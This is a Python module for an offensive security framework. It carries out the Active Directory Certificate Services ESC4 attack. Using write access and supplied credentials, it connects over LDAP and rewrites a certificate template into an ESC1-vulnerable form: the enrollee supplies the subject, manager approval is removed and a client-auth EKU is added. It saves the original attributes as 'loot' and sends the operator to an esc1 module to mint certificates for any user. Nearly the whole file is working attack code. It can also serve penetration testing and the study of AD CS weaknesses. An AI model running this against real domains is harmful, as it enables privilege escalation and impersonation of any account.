"""ESC4: rewrite a writable certificate template into an ESC1.

When you hold write access on a certificate TEMPLATE (GenericWrite /
WriteProperty — read it off adcs_enum or BloodHound), you don't need
anyone's misconfiguration: you MAKE the misconfiguration. Flip the
template to enrollee-supplies-subject, drop manager approval, make
sure it's actually enrollable, then run esc1 against it and mint a
certificate for anyone. Certipy's ESC4 path, FORGE-shaped.

The attribute set is exactly the lab bisect's answer:

  - msPKI-Certificate-Name-Flag = 1   (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
  - msPKI-Enrollment-Flag       = 0   (bit 0x2 means manager approval —
                                       requests pend instead of issuing)
  - msPKI-Template-Schema-Version = 1 (ABSENT, the policy module denies
                                       every request as "not supported")
  - pKIExtendedKeyUsage includes client auth (1.3.6.1.5.5.7.3.2)

ACTION=check reports the template's current ESC1 readiness; set
snapshots the original attributes to loot (JSON) and applies the
shape; clear restores the snapshot exactly. The CA's template cache
means a certsvc restart is needed before enrollment sees the change —
the module says so rather than letting you find out.
"""

import json
import random

from core.module import AuxiliaryModule
from core.options import OptAddress, OptEnum, OptString

try:
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
except ImportError:
    impacket_ldap = None  # console gates run() on requirements

CLIENT_AUTH_OID = "1.3.6.1.5.5.7.3.2"
WATCHED = ("msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag",
           "msPKI-Template-Schema-Version", "pKIExtendedKeyUsage",
           "msPKI-Certificate-Application-Policy", "pKIExpirationPeriod",
           "pKIOverlapPeriod", "pKIKeyUsage", "msPKI-Cert-Template-OID")
# the structural fields the policy module needs for issuance — a template
# without them is denied with a blank "Denied by Policy Module" (learned
# the hard way: WeakWeb denied until these landed)
STRUCTURAL = ("pKIExpirationPeriod", "pKIOverlapPeriod", "pKIKeyUsage")


def template_oid():
    """A forest-namespace template OID, unique per call."""
    return (f"1.3.6.1.4.1.311.21.8.{random.randint(10_000_000, 99_999_999)}"
            f".{random.randint(10_000_000, 99_999_999)}")


def esc1_ops(current, reference=None):
    """LDAP modify ops to make a template ESC1-shaped, given its current
    attributes ({name: [values]}). Only the needed changes — a template
    already correct gets no ops. `reference` carries a healthy template's
    structural values (the User template's) to copy when absent."""
    ops = {}
    if current.get("msPKI-Certificate-Name-Flag", ["0"])[0] != "1":
        ops["msPKI-Certificate-Name-Flag"] = [(2, ["1"])]
    if current.get("msPKI-Enrollment-Flag", ["0"])[0] != "0":
        ops["msPKI-Enrollment-Flag"] = [(2, ["0"])]
    if "msPKI-Template-Schema-Version" not in current:
        ops["msPKI-Template-Schema-Version"] = [(0, ["1"])]
    if CLIENT_AUTH_OID not in current.get("pKIExtendedKeyUsage", []):
        ops["pKIExtendedKeyUsage"] = [(0, [CLIENT_AUTH_OID])]
    if CLIENT_AUTH_OID not in current.get(
            "msPKI-Certificate-Application-Policy", []):
        ops["msPKI-Certificate-Application-Policy"] = [(0, [CLIENT_AUTH_OID])]
    if "msPKI-Cert-Template-OID" not in current:
        ops["msPKI-Cert-Template-OID"] = [(0, [template_oid()])]
    if reference is not None:
        for attr in STRUCTURAL:
            if attr not in current and attr in reference:
                ops[attr] = [(0, reference[attr])]
    return ops


def readiness(current):
    """(ready, [missing...]) — the human version of esc1_ops."""
    missing = []
    if current.get("msPKI-Certificate-Name-Flag", ["0"])[0] != "1":
        missing.append("enrollee-supplies-subject OFF")
    if current.get("msPKI-Enrollment-Flag", ["0"])[0] != "0":
        missing.append("manager approval ON")
    if "msPKI-Template-Schema-Version" not in current:
        missing.append("no schema-version (policy denies enrollment)")
    if CLIENT_AUTH_OID not in current.get("pKIExtendedKeyUsage", []):
        missing.append("no client-auth EKU")
    if CLIENT_AUTH_OID not in current.get(
            "msPKI-Certificate-Application-Policy", []):
        missing.append("no client-auth application policy")
    for attr in STRUCTURAL:
        if attr not in current:
            missing.append(f"no {attr} (policy denies enrollment)")
    if "msPKI-Cert-Template-OID" not in current:
        missing.append("no template OID")
    return not missing, missing


def attr_values(attr):
    """str values where possible, raw bytes for binary attrs (pKIKeyUsage,
    pKIExpirationPeriod...) — pyasn1 str() throws on non-UTF8."""
    out = []
    for v in attr["vals"]:
        try:
            out.append(str(v))
        except Exception:
            out.append(bytes(v))
    return out


def backup_encode(attrs):
    return {k: [v if isinstance(v, str) else {"hex": v.hex()}
                for v in vs] for k, vs in attrs.items()}


def backup_decode(data):
    return {k: [v if isinstance(v, str) else bytes.fromhex(v["hex"])
                for v in vs] for k, vs in data.items()}


class Esc4(AuxiliaryModule):
    name = "ESC4 (writable template -> ESC1)"
    description = """
        Rewrites a certificate template you have WRITE access on into
        ESC1 shape (enrollee-supplies-subject, no manager approval,
        schema-version present, client-auth EKU), then points you at
        esc1 for the enrollment. check reports readiness, set applies
        (original attributes saved as a loot backup), clear restores
        the backup. Restart certsvc on the CA before enrolling — the
        template cache is real.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller (LDAP)"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Account with write on the template"))
        self.options.add(OptString("PASSWORD", required=True,
                                   description="Password"))
        self.options.add(OptString("TARGET", required=True,
                                   description="Template name (cn)"))
        self.options.add(OptEnum("ACTION", ["check", "set", "clear"],
                                 default="check",
                                 description="check readiness / apply ESC1 / "
                                             "restore the backup"))

    def run(self):
        host = str(self.get_option("RHOSTS")).split(",")[0].strip()
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))
        target = str(self.get_option("TARGET"))
        action = str(self.get_option("ACTION"))
        base = ("CN=Certificate Templates,CN=Public Key Services,"
                "CN=Services,CN=Configuration," +
                ",".join(f"DC={p}" for p in domain.split(".")))
        try:
            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: LDAP bind failed - {e}")
            return
        try:
            dn, current = self._template(conn, base, target)
            if dn is None:
                self.print_error(f"{target}: no such template in the "
                                 f"config NC")
                return
            getattr(self, f"_{action}")(host, domain, target, base, dn,
                                        current, conn)
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def _template(self, conn, base, target):
        for packet in conn.search(
                searchBase=base,
                searchFilter=f"(cn={target})",
                attributes=list(WATCHED) + ["distinguishedName"]):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                attrs = {str(a["type"]): attr_values(a)
                         for a in packet["attributes"]}
                return str(packet["objectName"]), attrs
        return None, None

    # -- actions ---------------------------------------------------------

    def _check(self, host, domain, target, base, dn, current, conn):
        ready, missing = readiness(current)
        for attr in WATCHED:
            self.print_line(f"  {attr}: {current.get(attr, ['<unset>'])}")
        if ready:
            self.print_good(f"{target}: already ESC1-shaped — go enroll")
        else:
            self.print_status(f"{target}: not ESC1-ready: "
                              f"{'; '.join(missing)}")

    def _set(self, host, domain, target, base, dn, current, conn):
        # a healthy template's structural values to copy from — the
        # stock User template is the reference shape
        _udn, reference = self._template(conn, base, "User")
        ops = esc1_ops(current, reference)
        if not ops:
            self.print_good(f"{target}: already ESC1-shaped — nothing "
                            f"to change")
            return
        backup = backup_encode({attr: current.get(attr, [])
                                for attr in WATCHED})
        store = getattr(self.framework, "store", None)
        if store is not None:
            store.add_loot("esc4-backup",
                           f"esc4 {target} pre-set backup @ {host}",
                           json.dumps(backup), address=host)
        try:
            conn.modify(dn, ops)
        except Exception as e:
            self.print_error(f"{target}: template write failed (need "
                             f"write access) - {e}")
            return
        for attr in ops:
            self.print_debug(f"{target}: {attr} -> {ops[attr][0][1]}")
        self.print_good(f"{target}: rewritten into ESC1 shape "
                        f"({len(ops)} attribute(s), backup looted)")
        _dn, after = self._template(conn, base, target)
        ready, missing = readiness(after or {})
        if ready:
            self.print_status(f"{target}: verified ESC1-ready. Restart "
                              f"certsvc on the CA, then: use "
                              f"auxiliary/attack/esc1, set TEMPLATE {target}")
        else:
            self.print_error(f"{target}: still not ready after write: "
                             f"{'; '.join(missing)}")

    def _clear(self, host, domain, target, base, dn, current, conn):
        store = getattr(self.framework, "store", None)
        backups = store.loot("esc4-backup") if store is not None else []
        backups = [b for b in backups if target in b["label"]]
        if not backups:
            self.print_error(f"{target}: no esc4 backup in loot — "
                             f"nothing to restore")
            return
        backup = backup_decode(json.loads(backups[-1]["content"]))
        ops = {}
        for attr in WATCHED:
            original = backup.get(attr, [])
            if current.get(attr, []) != original:
                if original:
                    ops[attr] = [(2, original)]
                else:
                    ops[attr] = [(1, [])]
        if not ops:
            self.print_good(f"{target}: already matches the backup")
            return
        try:
            conn.modify(dn, ops)
        except Exception as e:
            self.print_error(f"{target}: restore failed - {e}")
            return
        self.print_good(f"{target}: restored from backup "
                        f"({len(ops)} attribute(s))")